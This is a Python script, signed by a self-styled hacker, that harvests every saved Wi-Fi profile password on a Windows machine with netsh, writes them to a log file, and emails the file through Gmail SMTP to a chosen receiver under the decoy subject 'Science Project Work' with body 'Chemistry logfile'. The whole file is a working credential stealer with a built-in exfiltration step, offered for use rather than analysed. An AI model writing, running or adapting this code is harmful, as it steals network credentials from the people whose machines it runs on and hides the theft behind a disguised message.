
import time
from tqdm import tqdm
import subprocess
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders



#Made by Hacker--Rohan Raj

print('''

██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░░░░░░░░░░░░░██████╗░░█████╗░██╗░░██╗░█████╗░███╗░░██╗
██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗░░░░░░░░░░░░██╔══██╗██╔══██╗██║░░██║██╔══██╗████╗░██║
███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝█████╗█████╗██████╔╝██║░░██║███████║███████║██╔██╗██║
██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗╚════╝╚════╝██╔══██╗██║░░██║██╔══██║██╔══██║██║╚████║
██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║░░░░░░░░░░░░██║░░██║╚█████╔╝██║░░██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░░░░░░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

██████╗░░█████╗░░░░░░██╗
██╔══██╗██╔══██╗░░░░░██║
██████╔╝███████║░░░░░██║
██╔══██╗██╔══██║██╗░░██║
██║░░██║██║░░██║╚█████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░
''')
txt = ""
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in tqdm(profiles):
    time.sleep(1)
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            txt += "{:<30}|  {:<}\n".format(i, results[0])
        except IndexError:
            txt += "{:<30}|  {:<}\n".format(i, "")
    except subprocess.CalledProcessError:
        txt += "{:<30}|  {:<}\n".format(i, "ENCODING ERROR")

with open('./log_,file.txt', 'w') as f:
    f.write(txt)


USERNAME = input('Gmail Address of the Sender')
PASSWORD = input('Password for the gmail Address of the Sender')
MYACC = input('Gmail Address of the Receiver')

fromaddr = USERNAME
toaddr = MYACC

# instance of MIMEMultipart
msg = MIMEMultipart()

# storing the senders email address
msg['From'] = fromaddr

# storing the receivers email address
msg['To'] = toaddr

# storing the subject
msg['Subject'] = "Science Project Work"

# string to store the body of the mail
body = "Chemistry logfile"

# attach the body with the msg instance
msg.attach(MIMEText(body, 'plain'))

# open the file to be sent
filename = "log_,file.txt"
attachment = open("log_,file.txt", "rb")

# instance of MIMEBase and named as p
p = MIMEBase('application', 'octet-stream')

# To change the payload into encoded form
p.set_payload((attachment).read())

# encode into base64
encoders.encode_base64(p)

p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

# attach the instance 'p' to instance 'msg'
msg.attach(p)

# creates SMTP session
s = smtplib.SMTP('smtp.gmail.com', 587)

# start TLS for security
s.starttls()

# Authentication
s.login(fromaddr, PASSWORD)

# Converts the Multipart msg into a string
text = msg.as_string()

# sending the mail
s.sendmail(fromaddr, toaddr, text)

# terminating the session
s.quit()
